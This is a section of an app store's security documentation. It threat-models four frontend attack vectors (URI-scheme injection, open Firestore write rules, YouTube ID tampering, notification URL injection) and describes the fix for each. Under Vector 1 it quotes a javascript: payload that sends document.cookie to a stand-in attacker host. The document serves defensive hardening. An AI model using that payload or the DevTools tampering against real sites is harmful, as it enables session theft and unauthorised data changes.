## 33. Frontend & Client-Facing Security Architecture, Threat Modeling & Hardening

### Threat Modeling: How an Attacker Could Target the Frontend

#### Vector 1: URI Scheme / Pseudo-Protocol Execution (`javascript:`, `vbscript:`, `data:`)
- **How an attacker would exploit it**:
  When submitting an app listing, an attacker puts `javascript:eval(atob('...'))` or `javascript:fetch('https://attacker.com/steal?c='+document.cookie)` in the Official Website, Privacy Policy, Terms & Conditions, or GitHub profile fields.
  When other users or store reviewers click "Official Website" or "Privacy Policy", the browser executes arbitrary JavaScript in the user's active session context.
- **Remediation**:
  Created `/src/utils/securityUtils.ts` with `sanitizeSafeUrl`, `sanitizeExternalUrl`, and strict protocol whitelisting (`http:`, `https:`, internal `/`, `#`). Dangerous schemes (`javascript:`, `data:`, `vbscript:`, `file:`, `blob:`) and control characters are stripped before being placed in `href` or `window.open()`.

#### Vector 2: Unauthenticated Database Mutation via Browser DevTools (Client-Side Firestore Tampering)
- **How an attacker would exploit it**:
  Previously, Firestore security rules allowed unrestricted write permissions on `/banners/{bannerId}`, `/notifications/{notificationId}`, `/app_moderation/{appId}`, `/banned_releases/{banId}`, and `/publisher_restrictions/{pubKey}` (`allow read, write: if true;`).
  Any user could open Chrome DevTools Console, obtain the Firebase instance, and execute:
  - Injected global phishing banners or malicious push notifications.
  - Wiped or tampered with moderation approval flags (`/app_moderation`).
  - Removed hashes from `/banned_releases` to unban prohibited binaries.
- **Remediation**:
  Updated `firestore.rules` to enforce `allow write: if isAdmin();` on all administrative collections (`notifications`, `banners`, `app_moderation`, `banned_releases`, `publisher_restrictions`). Also enforced that `create` on `/apps/{appId}` verifies that the caller owns the document (`request.resource.data.owner == request.auth.uid || isAdmin()`), preventing identity spoofing.

#### Vector 3: YouTube Iframe Hijacking & Video ID Traversal
- **How an attacker would exploit it**:
  An attacker provides a manipulated `promoVideoUrl` with directory traversal or extra URL query parameters intended to alter iframe attributes, or bypass YouTube nocookie domains.
- **Remediation**:
  Hardened `extractYouTubeId` and `sanitizeYouTubeId` using strict regex `^[a-zA-Z0-9_-]{11}$`. If a video ID does not conform to the exact 11-character format, it is rejected, neutralizing parameter pollution and directory traversal.

#### Vector 4: Notification `window.open` Injection
- **How an attacker would exploit it**:
  When tapping a broadcast notification with an `actionUrl`, an unsanitized URL could execute `javascript:` or redirect to an unvalidated external scheme.
- **Remediation**:
  Protected `NotificationsPage.tsx` using `sanitizeExternalUrl(notif.actionUrl)`, ensuring only validated `https://` or `http://` targets can be invoked.

